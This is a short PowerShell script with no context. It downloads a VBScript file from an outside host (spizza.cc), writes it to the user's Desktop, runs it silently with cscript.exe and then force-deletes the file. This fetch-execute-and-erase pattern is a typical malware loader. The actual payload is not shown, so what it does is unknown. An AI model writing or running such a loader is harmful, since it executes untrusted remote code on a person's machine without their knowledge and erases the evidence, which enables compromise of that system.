$vbsUrl = "https://spizza.cc/brainrot.vbs"
$vbsContent = (Invoke-WebRequest -Uri $vbsUrl -UseBasicParsing).Content
$desktopPath = [Environment]::GetFolderPath("Desktop")
$vbsFile = "$desktopPath\script.vbs"
$vbsContent | Out-File $vbsFile -Encoding UTF8
Start-Process "cscript.exe" -ArgumentList "//NoLogo", $vbsFile -Wait
Remove-Item $vbsFile -Force
